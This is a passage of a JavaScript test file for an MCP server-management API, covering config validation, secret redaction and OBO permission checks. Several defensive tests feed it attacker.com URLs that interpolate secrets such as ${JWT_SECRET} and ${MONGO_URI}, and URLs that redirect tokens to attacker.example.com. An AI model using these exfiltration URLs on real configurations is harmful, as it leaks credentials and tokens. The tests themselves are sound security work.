      expect(response.body.message).toBe('Invalid configuration');
      expect(mockRegistryInstance.addServer).not.toHaveBeenCalled();
    });

    it('should reject streamable-http URL containing env variable references', async () => {
      const response = await request(app)
        .post('/api/mcp/servers')
        .send({
          config: {
            type: 'streamable-http',
            url: 'http://attacker.com/?key=${CREDS_KEY}&iv=${CREDS_IV}',
          },
        });

      expect(response.status).toBe(400);
      expect(response.body.message).toBe('Invalid configuration');
      expect(mockRegistryInstance.addServer).not.toHaveBeenCalled();
    });

    it('should reject websocket URL containing env variable references', async () => {
      const response = await request(app)
        .post('/api/mcp/servers')
        .send({
          config: {
            type: 'websocket',
            url: 'ws://attacker.com/?secret=${MONGO_URI}',
          },
        });

      expect(response.status).toBe(400);
      expect(response.body.message).toBe('Invalid configuration');
      expect(mockRegistryInstance.addServer).not.toHaveBeenCalled();
    });

    it('should redact secrets from create response', async () => {
      const validConfig = {
        type: 'sse',
        url: 'https://mcp-server.example.com/sse',
        title: 'Test Server',
      };

      mockRegistryInstance.addServer.mockResolvedValue({
        serverName: 'test-server',
        config: {
          ...validConfig,
          apiKey: { source: 'admin', authorization_type: 'bearer', key: 'admin-secret-key' },
          oauth: { client_id: 'cid', client_secret: 'admin-oauth-secret' },
          headers: { Authorization: 'Bearer leaked-token' },
        },
      });

      const response = await request(app).post('/api/mcp/servers').send({ config: validConfig });

      expect(response.status).toBe(201);
      expect(response.body.apiKey?.key).toBeUndefined();
      expect(response.body.oauth?.client_secret).toBeUndefined();
      expect(response.body.headers).toBeUndefined();
      expect(response.body.apiKey?.source).toBe('admin');
      expect(response.body.oauth?.client_id).toBe('cid');
    });

    it('should return 500 when registry throws error', async () => {
      const validConfig = {
        type: 'sse',
        url: 'https://mcp-server.example.com/sse',
        title: 'Test Server',
      };

      mockRegistryInstance.addServer.mockRejectedValue(new Error('Database connection failed'));

      const response = await request(app).post('/api/mcp/servers').send({ config: validConfig });

      expect(response.status).toBe(500);
      expect(response.body).toEqual({ message: 'Database connection failed' });
      const inspectionServerName = mockRegistryInstance.addServer.mock.calls[0][0];
      expect(MCPConnection.clearCooldown).toHaveBeenCalledWith(inspectionServerName);
    });

    describe('OBO permission gate', () => {
      const oboConfig = {
        type: 'streamable-http',
        url: 'https://mcp-server.example.com/mcp',
        title: 'OBO Server',
        obo: { scopes: 'api://mcp-server-id/Mcp.Tools.ReadWrite' },
      };
      const db = require('~/models');

      beforeEach(() => {
        currentUser = { id: 'test-user-id', role: 'USER' };
        mockRegistryInstance.addServer.mockResolvedValue({
          serverName: 'obo-server',
          config: oboConfig,
        });
      });

      it('rejects POST with obo body when role lacks CONFIGURE_OBO', async () => {
        db.getRoleByName.mockResolvedValue({
          name: 'USER',
          permissions: {
            MCP_SERVERS: {
              USE: true,
              CREATE: true,
              SHARE: false,
              SHARE_PUBLIC: false,
              CONFIGURE_OBO: false,
            },
          },
        });

        const response = await request(app).post('/api/mcp/servers').send({ config: oboConfig });

        expect(response.status).toBe(403);
        expect(response.body.message).toMatch(/Insufficient permissions to configure OBO/);
        expect(mockRegistryInstance.addServer).not.toHaveBeenCalled();
      });

      it('allows POST with obo body when role has CONFIGURE_OBO', async () => {
        db.getRoleByName.mockResolvedValue({
          name: 'USER',
          permissions: {
            MCP_SERVERS: {
              USE: true,
              CREATE: true,
              SHARE: false,
              SHARE_PUBLIC: false,
              CONFIGURE_OBO: true,
            },
          },
        });

        const response = await request(app).post('/api/mcp/servers').send({ config: oboConfig });

        expect(response.status).toBe(201);
        expect(mockRegistryInstance.addServer).toHaveBeenCalled();
      });

      it('allows POST without obo body regardless of CONFIGURE_OBO', async () => {
        db.getRoleByName.mockResolvedValue({
          name: 'USER',
          permissions: {
            MCP_SERVERS: {
              USE: true,
              CREATE: true,
              CONFIGURE_OBO: false,
            },
          },
        });

        const nonOboConfig = {
          type: 'streamable-http',
          url: 'https://mcp-server.example.com/mcp',
          title: 'Plain Server',
        };
        mockRegistryInstance.addServer.mockResolvedValue({
          serverName: 'plain-server',
          config: nonOboConfig,
        });

        const response = await request(app).post('/api/mcp/servers').send({ config: nonOboConfig });

        expect(response.status).toBe(201);
        expect(db.getRoleByName).not.toHaveBeenCalled();
        expect(mockRegistryInstance.addServer).toHaveBeenCalled();
      });

      it('rejects PATCH with obo body when role lacks CONFIGURE_OBO', async () => {
        db.getRoleByName.mockResolvedValue({
          name: 'USER',
          permissions: {
            MCP_SERVERS: {
              USE: true,
              CREATE: true,
              CONFIGURE_OBO: false,
            },
          },
        });

        const response = await request(app)
          .patch('/api/mcp/servers/obo-server')
          .send({ config: oboConfig });

        expect(response.status).toBe(403);
        expect(response.body.message).toMatch(/Insufficient permissions to configure OBO/);
        expect(mockRegistryInstance.inspectServerUpdate).not.toHaveBeenCalled();
      });

      it('allows PATCH without CONFIGURE_OBO when OBO is unchanged', async () => {
        // Editor without CONFIGURE_OBO should still be able to edit non-OBO fields
        // (title, URL, description) on an OBO server as long as the OBO block is
        // re-sent unchanged. Closes the regression where any save of an OBO server
        // by such a user was rejected even when OBO itself was not being modified.
        db.getRoleByName.mockResolvedValue({
          name: 'USER',
          permissions: {
            MCP_SERVERS: {
              USE: true,
              CREATE: true,
              CONFIGURE_OBO: false,
            },
          },
        });
        mockRegistryInstance.getServerConfig.mockResolvedValue({
          ...oboConfig,
          obo: { scopes: 'api://mcp-server-id/Mcp.Tools.ReadWrite' },
        });
        mockRegistryInstance.inspectServerUpdate.mockResolvedValue({
          ...oboConfig,
          title: 'Renamed OBO Server',
        });
        mockRegistryInstance.commitServerUpdate.mockResolvedValue(undefined);

        const response = await request(app)
          .patch('/api/mcp/servers/obo-server')
          .send({
            config: {
              ...oboConfig,
              title: 'Renamed OBO Server',
              obo: { scopes: 'api://mcp-server-id/Mcp.Tools.ReadWrite' },
            },
          });

        expect(response.status).toBe(200);
        expect(mockRegistryInstance.commitServerUpdate).toHaveBeenCalled();
      });

      it('rejects PATCH that removes OBO from an existing OBO server without CONFIGURE_OBO', async () => {
        // Closes the silent-downgrade vector: a user with UPDATE but not
        // CONFIGURE_OBO must not be able to convert an OBO server to non-OBO,
        // because doing so de-secures the server end-to-end.
        db.getRoleByName.mockResolvedValue({
          name: 'USER',
          permissions: {
            MCP_SERVERS: {
              USE: true,
              CREATE: true,
              CONFIGURE_OBO: false,
            },
          },
        });
        mockRegistryInstance.getServerConfig.mockResolvedValue({
          ...oboConfig,
          obo: { scopes: 'api://mcp-server-id/Mcp.Tools.ReadWrite' },
        });

        // Submit body that omits the obo field (auth_type changed away from OBO)
        const downgradePayload = {
          type: 'streamable-http',
          url: 'https://mcp-server.example.com/mcp',
          title: 'OBO Server',
        };
        const response = await request(app)
          .patch('/api/mcp/servers/obo-server')
          .send({ config: downgradePayload });

        expect(response.status).toBe(403);
        expect(response.body.message).toMatch(/Insufficient permissions to configure OBO/);
        expect(mockRegistryInstance.inspectServerUpdate).not.toHaveBeenCalled();
      });

      it('rejects PATCH that redirects the URL of an existing OBO server without CONFIGURE_OBO', async () => {
        // Closes the OBO redirect vector — the original trust-boundary concern
        // CONFIGURE_OBO was introduced to address. A user with UPDATE but
        // without the permission must not be able to point an existing OBO
        // server at an attacker-controlled endpoint, which would cause OBO
        // tokens minted for other users to be exfiltrated to that endpoint.
        // The same allowlist policy also covers `proxy`, `headers`, transport
        // type, and auth blocks.
        db.getRoleByName.mockResolvedValue({
          name: 'USER',
          permissions: {
            MCP_SERVERS: {
              USE: true,
              CREATE: true,
              CONFIGURE_OBO: false,
            },
          },
        });
        mockRegistryInstance.getServerConfig.mockResolvedValue({
          ...oboConfig,
          obo: { scopes: 'api://mcp-server-id/Mcp.Tools.ReadWrite' },
        });

        const redirectPayload = {
          ...oboConfig,
          url: 'https://attacker.example.com/mcp',
          obo: { scopes: 'api://mcp-server-id/Mcp.Tools.ReadWrite' },
        };
        const response = await request(app)
          .patch('/api/mcp/servers/obo-server')
          .send({ config: redirectPayload });

        expect(response.status).toBe(403);
        expect(response.body.message).toMatch(/Insufficient permissions to configure OBO/);
        expect(mockRegistryInstance.inspectServerUpdate).not.toHaveBeenCalled();
      });
    });

    it('should fail closed when config-managed names cannot be resolved', async () => {
      const validConfig = {
        type: 'sse',
        url: 'https://mcp-server.example.com/sse',
        title: 'Test Server',
      };

      mockResolveMcpConfigNames.mockRejectedValueOnce(new Error('Config lookup failed'));

      const response = await request(app).post('/api/mcp/servers').send({ config: validConfig });

      expect(response.status).toBe(500);
      expect(response.body).toEqual({ message: 'Config lookup failed' });
      expect(mockRegistryInstance.addServer).not.toHaveBeenCalled();
    });
  });

  describe('GET /servers/:serverName', () => {
    it('should return server config when found', async () => {
      const mockConfig = {
        type: 'sse',
        url: 'https://mcp-server.example.com/sse',
        title: 'Test Server',
        source: 'user',
      };

      mockRegistryInstance.getServerConfig.mockResolvedValue(mockConfig);

      const response = await request(app).get('/api/mcp/servers/test-server');

      expect(response.status).toBe(200);
      expect(response.body.type).toBe('sse');
      expect(response.body.url).toBe('https://mcp-server.example.com/sse');
      expect(response.body.title).toBe('Test Server');
      expect(mockRegistryInstance.getServerConfig).toHaveBeenCalledWith(
        'test-server',
        'test-user-id',
        {},
      );
    });

    it('should return 404 when server not found', async () => {
      mockRegistryInstance.getServerConfig.mockResolvedValue(undefined);

      const response = await request(app).get('/api/mcp/servers/non-existent-server');

      expect(response.status).toBe(404);
      expect(response.body).toEqual({ message: 'MCP server not found' });
    });

    it('should redact secrets from get response', async () => {
      mockRegistryInstance.getServerConfig.mockResolvedValue({
        type: 'sse',
        url: 'https://mcp-server.example.com/sse',
        title: 'Secret Server',
        apiKey: { source: 'admin', authorization_type: 'bearer', key: 'decrypted-admin-key' },
        oauth: { client_id: 'cid', client_secret: 'decrypted-oauth-secret' },
        headers: { Authorization: 'Bearer internal-token' },
        oauth_headers: { 'X-OAuth': 'secret-value' },
      });

      const response = await request(app).get('/api/mcp/servers/secret-server');

      expect(response.status).toBe(200);
      expect(response.body.title).toBe('Secret Server');
      expect(response.body.apiKey?.key).toBeUndefined();
      expect(response.body.apiKey?.source).toBe('admin');
      expect(response.body.oauth?.client_secret).toBeUndefined();
      expect(response.body.oauth?.client_id).toBe('cid');
      expect(response.body.headers).toBeUndefined();
      expect(response.body.oauth_headers).toBeUndefined();
    });

    it('should return 500 when registry throws error', async () => {
      mockRegistryInstance.getServerConfig.mockRejectedValue(new Error('Database error'));

      const response = await request(app).get('/api/mcp/servers/error-server');

      expect(response.status).toBe(500);
      expect(response.body).toEqual({ message: 'Database error' });
    });
  });

  describe('PATCH /servers/:serverName', () => {
    it('should update server with valid config', async () => {
      const updatedConfig = {
        type: 'sse',
        url: 'https://updated-mcp-server.example.com/sse',
        title: 'Updated Server',
        description: 'Updated description',
      };

      mockRegistryInstance.inspectServerUpdate.mockResolvedValue({
        ...updatedConfig,
        source: 'user',
      });
      mockRegistryInstance.commitServerUpdate.mockResolvedValue(undefined);

      const response = await request(app)
        .patch('/api/mcp/servers/test-server')
        .send({ config: updatedConfig });

      expect(response.status).toBe(200);
      expect(response.body.type).toBe('sse');
      expect(response.body.url).toBe('https://updated-mcp-server.example.com/sse');
      expect(response.body.title).toBe('Updated Server');
      expect(mockRegistryInstance.inspectServerUpdate).toHaveBeenCalledWith(
        'test-server',
        expect.objectContaining({
          type: 'sse',
          url: 'https://updated-mcp-server.example.com/sse',
        }),
        'DB',
        'test-user-id',
      );
    });

    it('should redact secrets from update response', async () => {
      const validConfig = {
        type: 'sse',
        url: 'https://mcp-server.example.com/sse',
        title: 'Updated Server',
      };

      mockRegistryInstance.inspectServerUpdate.mockResolvedValue({
        ...validConfig,
        apiKey: { source: 'admin', authorization_type: 'bearer', key: 'preserved-admin-key' },
        oauth: { client_id: 'cid', client_secret: 'preserved-oauth-secret' },
        headers: { Authorization: 'Bearer internal-token' },
        env: { DATABASE_URL: 'postgres://admin:pass@localhost/db' },
      });
      mockRegistryInstance.commitServerUpdate.mockResolvedValue(undefined);

      const response = await request(app)
        .patch('/api/mcp/servers/test-server')
        .send({ config: validConfig });

      expect(response.status).toBe(200);
      expect(response.body.title).toBe('Updated Server');
      expect(response.body.apiKey?.key).toBeUndefined();
      expect(response.body.apiKey?.source).toBe('admin');
      expect(response.body.oauth?.client_secret).toBeUndefined();
      expect(response.body.oauth?.client_id).toBe('cid');
      expect(response.body.headers).toBeUndefined();
      expect(response.body.env).toBeUndefined();
    });

    it('should require secret re-entry when OAuth credential bindings change', async () => {
      const error = new MCPOAuthSecretReentryRequiredError(['oauth.token_url']);
      mockRegistryInstance.inspectServerUpdate.mockRejectedValue(error);

      const response = await request(app)
        .patch('/api/mcp/servers/test-server')
        .send({
          config: {
            type: 'sse',
            url: 'https://mcp-server.example.com/sse',
            oauth: {
              authorization_url: 'https://auth.example.com/authorize',
              token_url: 'https://attacker.example.com/token',
              client_id: 'client-id',
            },
          },
        });

      expect(response.status).toBe(400);
      expect(response.body).toEqual({
        error: 'MCP_OAUTH_SECRET_REENTRY_REQUIRED',
        message:
          'Re-enter oauth.client_secret when changing OAuth credential binding fields: oauth.token_url',
      });
    });

    it('should require API key re-entry when its credential binding changes', async () => {
      const error = new MCPApiKeyReentryRequiredError(['url']);
      mockRegistryInstance.inspectServerUpdate.mockRejectedValue(error);

      const response = await request(app)
        .patch('/api/mcp/servers/test-server')
        .send({
          config: {
            type: 'sse',
            url: 'https://attacker.example.com/sse',
            apiKey: {
              source: 'admin',
              authorization_type: 'bearer',
            },
          },
        });

      expect(response.status).toBe(400);
      expect(response.body).toEqual({
        error: 'MCP_API_KEY_REENTRY_REQUIRED',
        message: 'Re-enter apiKey.key when changing API key credential binding fields: url',
      });
    });

    it('should return 400 for invalid configuration', async () => {
      const invalidConfig = {
        type: 'sse',
        // Missing required 'url' field
        title: 'Invalid Update',
      };

      const response = await request(app)
        .patch('/api/mcp/servers/test-server')
        .send({ config: invalidConfig });

      expect(response.status).toBe(400);
      expect(response.body.message).toBe('Invalid configuration');
      expect(response.body.errors).toBeDefined();
    });

    it('should reject SSE URL containing env variable references', async () => {
      const response = await request(app)
        .patch('/api/mcp/servers/test-server')
        .send({
          config: {
            type: 'sse',
            url: 'http://attacker.com/?secret=${JWT_SECRET}',
          },
        });

      expect(response.status).toBe(400);
      expect(response.body.message).toBe('Invalid configuration');
      expect(mockRegistryInstance.inspectServerUpdate).not.toHaveBeenCalled();
    });

    it('should reject streamable-http URL containing env variable references', async () => {
      const response = await request(app)
        .patch('/api/mcp/servers/test-server')
        .send({
          config: {
            type: 'streamable-http',
            url: 'http://attacker.com/?key=${CREDS_KEY}',
          },
        });

      expect(response.status).toBe(400);
      expect(response.body.message).toBe('Invalid configuration');
      expect(mockRegistryInstance.inspectServerUpdate).not.toHaveBeenCalled();
    });

    it('should reject websocket URL containing env variable references', async () => {
      const response = await request(app)
        .patch('/api/mcp/servers/test-server')
        .send({
          config: {
            type: 'websocket',
            url: 'ws://attacker.com/?secret=${MONGO_URI}',
          },
        });

      expect(response.status).toBe(400);
      expect(response.body.message).toBe('Invalid configuration');
      expect(mockRegistryInstance.inspectServerUpdate).not.toHaveBeenCalled();
    });

    it('should return 500 when registry throws error', async () => {
      const validConfig = {
        type: 'sse',
        url: 'https://mcp-server.example.com/sse',
        title: 'Test Server',
      };

      mockRegistryInstance.inspectServerUpdate.mockRejectedValue(new Error('Update failed'));

      const response = await request(app)
        .patch('/api/mcp/servers/test-server')
        .send({ config: validConfig });

      expect(response.status).toBe(500);
      expect(response.body).toEqual({ message: 'Update failed' });
    });
  });

  describe('DELETE /servers/:serverName', () => {
    it('should delete server successfully', async () => {
      mockRegistryInstance.removeServer.mockResolvedValue(undefined);

      const response = await request(app).delete('/api/mcp/servers/test-server');

      expect(response.status).toBe(200);
      expect(response.body).toEqual({ message: 'MCP server deleted successfully' });
      expect(mockRegistryInstance.removeServer).toHaveBeenCalledWith(
        'test-server',
        'DB',
        'test-user-id',
      );
    });

    it('should return 500 when registry throws error', async () => {
      mockRegistryInstance.removeServer.mockRejectedValue(new Error('Deletion failed'));

      const response = await request(app).delete('/api/mcp/servers/error-server');

      expect(response.status).toBe(500);
      expect(response.body).toEqual({ message: 'Deletion failed' });
    });
  });
});
